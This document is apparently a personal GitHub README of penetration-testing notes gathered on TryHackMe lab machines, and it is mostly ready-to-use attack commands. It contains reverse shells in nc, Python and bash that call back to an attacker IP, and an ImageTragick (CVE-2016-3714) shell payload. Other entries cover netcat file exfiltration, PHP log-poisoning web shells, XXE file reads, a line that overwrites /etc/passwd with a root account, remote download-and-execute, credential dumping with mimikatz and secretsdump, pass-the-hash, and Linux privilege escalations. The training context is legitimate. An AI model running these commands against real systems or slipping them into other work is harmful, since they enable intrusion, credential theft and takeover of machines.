# HackNotes

This repository contains my personal notes and tricks that I've gathered while working on various machines in the TryHackMe platform. These notes serve as a guide for penetration testing and help me document my progress and findings.

Please note that these notes are a work in progress, and I'll be continuously adding more content as I progress through the challenges and machines.

## Introduction
In this repository, you will find a compilation of various tricks, commands, and techniques that can be useful during penetration testing activities. These notes are intended to assist in the process of hacking and securing systems.

## Tricks
Here are some handy tricks to enhance your pentesting workflow:

---
#### Spawn a fully interactive shell:
```python
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm
```

<details><summary>other</summary>

#### scan rpc port
```
nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount $IP
```

#### Read file:
```python
xxd -r file.txt 
base64 /etc/shadow | base64 -d
```
`l\s`: Equivalent to `ls`

#### if command to long
```python
python3 py.py 10.10.13.118 "$(cat revshell.ps1)"
```

#### Decompress a gzip file:
```
gzip -d file.gz
```
#### Change file without vim or nano
```
cat > file << EOF 
....
EOF
```

#### php extensions to run revsell
```
.php
.php3
.php4
.php5
.phtml
```

#### broken png image
```
xxd thm.jpg | head
printf '\xff\xd8\xff\xe0\x00\x10\x4a\x46\x49\x46\x00\x01' | dd conv=notrunc of=thm.jpg bs=1
```
#### NFS share
```
mkdir tmp/
sudo mount -t nfs 10.10.104.64: tmp
tree tmp
```

#### socat if open port
```python
./socat tcp-listen:7777,reuseaddr,fork tcp:localhost:6666
```

#### create new user in /etc/passwd with root

```
echo "user:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash" > /etc/passwd
```

</details>

---
#### Reverse shells
```nc
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.18.22.27 4444 >/tmp/f
```
```python
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])'
```
```python
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.18.22.27",4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'
```
```bash
bash -i >& /dev/tcp/10.18.22.27/4444 0>&1
```
<details><summary>CVE-2016–3714</summary>

```
cat > image.png << EOF
push graphic-context
encoding "UTF-8"
viewbox 0 0 1 1
affine 1 0 0 1 0 0
push graphic-context
image Over 0,0 1,1 '|/bin/bash -i > /dev/tcp/10.8.50.72/4444 0<&1 2>&1'
pop graphic-context
pop graphic-context
EOF
```
</details>

---
#### File Transfer on `Netcat`

1. To download a file on the remote shell:
```nc
nc ATTACKER_IP ATTACKER_PORT < [file_to_download]
```
2. To receive the file on the attacker machine:
```nc
nc -l ATTACKER_PORT > [output_file_path]
```
#### Transfer files using `scp`:
```
scp backup.zip toor@192.168.122.30:/home/username_of_remote_host
```
---
<details><summary>Web</summary>

#### Discover hidden directories:
```linux
wfuzz -w /usr/share/dirb/wordlists/dirbuster/directory-list-2.3-medium.txt --hc 404 http://$IP/island/2100/FUZZ.ticket

feroxbuster -u http://$IP/ -w /usr/share/seclists/Discovery/Web-Content/common.txt -s 200
```

#### Discover subdomains with `wfuzz` :
```
wfuzz -c -w /usr/share/dirb/wordlists/subdomains-top1million-5000.txt -u "http://team.thm" -H "Host: FUZZ.team.thm" --hw 977 
```
#### Discover files with `wfuzz` :
```
wfuzz -c -w /usr/share/dirb/wordlists/LFI-gracefulsecurity-linux.txt -u http://dev.team.thm/script.php\?page\=FUZZ --hw=0
```
#### Brute force wordpress
```
wpscan --url http://target_on_wp.com/ -e u -P /usr/share/wordlists/rockyou.txt
```
#### Example of XXE 
```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>
<comment>
  <name>Joe Hamd</name>
  <author>Barry Clad</author>
  <com>&xxe;</com>
</comment>
```
#### php local file inclusion
```
http://10.10.62.183/?view=php://filter/read=convert.base64-encode/resource=dog/../index
curl "http://10.10.62.183/" -H "User-Agent: <?php system(\$_GET['cmd']); ?>"
http://10.10.62.183/?view=dog/../../../../var/log/apache2/access.log&ext&cmd='command'
```
#### bypass waf sqlmap
```
--tamper=space2comment
```

#### cadaver for WebDAV

</details>

---
### Linux Privilege Escalation:
<details><summary> LXD container exploitation </summary> 

```
wget archive
lxc image import ./archive --alias myimage
lxc image list
lxc init myimage ignite -c security.privileged=true # If not working, use FINGERPRINT
lxc config device add ignite mydevice disk source=/ path=/mnt/root recursive=true
lxc start ignite
lxc exec ignite /bin/sh
```
</details>
<details><summary> with doas </summary>

```
doas -u root openssl enc -in file
doas -u root /bin/bash
```
</details>
<details><summary> with npm -u </summary>

```
mkdir ~/tmp
echo '{"scripts": {"preinstall": "/bin/sh"}}' > ~/tmp/package.json
sudo -u serv-manage /usr/bin/npm -C ~/tmp/ --unsafe-perm i
```
</details>

<details><summary>PATH</summary>

```
echo /bin/sh > curl
chmod 777 curl
export PATH=/tmp:$PATH
./app_that_calls_curl
```

</details>

#### information gathering
```
cat /proc/version
cat /etc/issue
cat /etc/sudoers
cat /etc/sudoers.d
ps
env
sudo -l
hystory
ifconfig
ip route
uname -a
netstat # -at -l -t -tp -i
netstat -tupln | grep LISTEN
find / -writable 2>/dev/null
find / -mtime 10 #find files that were modified in the last 10 days
find . -name flag1.txt
find / -type d -name config #find the directory named config under “/”
find / -type f -perm /4000 2>/dev/null
find / -type f -user <user> 2>/dev/null #find files owned by user
getcap -r / 2>/dev/null
cat /etc/exports #file sharing
nmap --script=vuln <ip>
cat /proc/1/cgroup #if u in docker
```
#### links
* [linPeas](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)
* [linEnum](https://github.com/rebootuser/LinEnum)
* [LES](https://github.com/mzet-/linux-exploit-suggester)
* [Linux Smart Enumeration](https://github.com/diego-treitos/linux-smart-enumeration)
* [linux Priv Checker](https://github.com/linted/linuxprivchecker)
* [Linux Kernel CVEs](https://www.linuxkernelcves.com/cves)
* [GTFOBins (unix)](https://gtfobins.github.io/)
* [g0tmi1k priv esc linux](https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/)


---

### Windows

<details><summary> windows system tools </summary>
<details><summary> Local User and Group Management </summary>
It is a shell application to manage Windows system administrator applications.

```
lusrmgr.msc
```
</details>
<details> <summary> System Configuration utility </summary>

for diagnose startup issues

```
MSConfig
```
</details>
<details> <summary> Task Manager </summary>

to manage (enable/disable) startup items. 
```
taskmgr
```
</details>
<details> <summary> User Account Control </summary>
helps prevent unauthorized changes (which may be initiated by applications, users, viruses, or other forms of malware) to an operating system

```
UserAccountControlSettings.exe
```
</details>
<details> <summary> Computer Management </summary>
the process of managing, monitoring and optimizing a computer system for performance, availability, security

```
compmgmt
```
</details>
<details> <summary> System Information </summary> 
(gathers information about your computer and displays a comprehensive view of your hardware, system components, and software environment, which you can use to diagnose computer issues.)

```
msinfo32
```
</details>
<details> <summary> Resource Monitor </summary>
displays per-process and aggregate CPU, memory, disk, and network usage information, in addition to providing details about which processes are using individual file handles and modules

```
resmon
```
</details>
<details> <summary> Windows Registry </summary>
central hierarchical database used to store information necessary to configure the system for one or more users, applications, and hardware devices

```
regedit
```
</details>
<details><summary>Group policy objects</summary>
a collection of settings that can be applied to OUs
</details>

<details><summary>PowerShell enumeration</summary>

view all of the hidden files in the current directory
```
Get-ChildItem -File -Hidden -ErrorAction SilentlyContinue
```
</details>
</details>

<details><summary> SMB enumeration </summary>

enumerate

```
enum4linux -h
```
open SMB shares

```
smbclient -L $IP
smbclient //$IP/share # -c 'recurse;ls' 
```

enumeration
```
smbmap -H $IP
smbmap -H '$IP' -u '' -p '' -R 
smbmap -H '$IP' -u '' -p '' -R -A 'enter.txt' #download file
```

scan with nmap

```
nmap -p 139,445 -Pn -script smb-enum* $IP
nmap -p 139,445 -Pn -script smb-vuln* $IP
nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse $IP
```

connect with smbclient

```
smbclient \\\\$IP\\nt4wrksv
```

</details>

<details><summary>rdp </summary>

```
rdesktop -u <username> -p <password> $IP -g 70% -r disk:folder=/home/toor/cd/apps
```

</details>

<details><summary>AD</summary>

extract credentials and secrets from a systemdump
```
impacket-secretsdump <domain.local>/<user>:<password>@<ip> 
``` 

where we can pht
```
crackmapexec smb <ip>/24 -u '<username>' -H <hash> --local-auth                                
```

login with pht
```
impacket-psexec <username>@<ip> -hashes <hash>
```

Responder is a LLMNR, NBT-NS and MDNS poisoner, with built-in HTTP/SMB/MSSQL/FTP/LDAP rogue authentication server supporting
```
responder -I eth0 -rdwv
```

DNSRecon - is a powerful DNS enumeration script
```
dnsrecon -d <IP> -t axfr
use auxiliary/gather/enum_dns #with metasploit
```

upload file with cmd
```
certutil -split -f -urlcache http://<your IP>/file_to_download
powershell -c 'IEX(New-Object Net.WebClient).downloadstring("http://<your_ip>/<file>")' #execute file without download (!!)
```

evil-winrm - Windows Remote Management (if 5985 or 5986 ports are open)
```
evil-winrm -u <username> -p <password> -i <ip>
upload <file on your ps directory> #to upload file
```

kerberoasting
```
sudo ntpdate <target ip>
impacket-GetUserSPNs domain.local/Admin:passwd -dc-ip $IP -request
```

links
* [WADComs (AD)](https://wadcoms.github.io/)

</details>

<details><summary>Priv esc/enum</summary>

run powershell with bypass execution policy
```
powershell -ep bypass
```

```
whoami /priv #/groups
net user
net users
net localgroups
net user <user>
net group /<domain>
netsh firewall show state
netsh firewall show config
netstat -ano
findstr /si password *.txt # .xml .ini
findstr /spin "password" *.*
dir /s *pass* == *cred* == *vnc* == *config*
```

PowerView.ps1
```
Invoke-ShareFinder
Windows 10 Enterprise Evaluation
get-netuser | select cn #enum domain users
Get-NetGroup -GroupName *admin* #enum domain groups
```

mimikatz
```
privilege::debug #ensure that the output is "Privilege '20' ok"
lsadump::lsa /patch #dump hashes
```

- [powerview](https://gist.github.com/HarmJ0y/184f9822b195c52dd50c379ed3117993)
- [windows-exploit-suggester](https://github.com/AonCyberLabs/Windows-Exploit-Suggester)
- [winpeas](https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS)
- [sushant747 win priv esc](https://sushant747.gitbooks.io/total-oscp-guide/content/privilege_escalation_windows.html)(with vpn)
- [LOLBAS (windows)](https://lolbas-project.github.io/)
- [JAWS](https://github.com/411Hall/JAWS)
- [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1)


</details>

---

### links
* [database with CVE exploits](https://cvexploits.io/)
* [explainshell.com](https://explainshell.com/)
* [reverse shells](https://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
* [rapid7](https://www.rapid7.com/)
* [attackerkb](https://attackerkb.com/)
* [cve.mitre.org](https://cve.mitre.org/cve/)
* [exploit-db](https://www.exploit-db.com/)
* [WTFBINS (cve)](https://wtfbins.wtf/)
* [PayloadAllTheThings](https://github.com/swisskyrepo/PayloadsAllTheThings/)
* [hacktricks](https://book.hacktricks.xyz)

####  Encoding techniques:
- [splitbrain](https://www.splitbrain.org/_static/ook/)
- [hashes](https://hashes.com/en/tools/hash_identifier)
- [md5hashing](https://md5hashing.net/hash)
- [cyberchef](https://gchq.github.io/CyberChef/)
- [free pass hash cracker](https://crackstation.net/)
- [crack station](https://crackstation.net/)
- [md5decrypt.net](https://md5decrypt.net/en/)

#### Tools

* [Git research](https://github.com/internetwache/GitTools)
* [enumeration guide](https://github.com/beyondtheoryio/Enumeration-Guide)

---
Happy hacking!
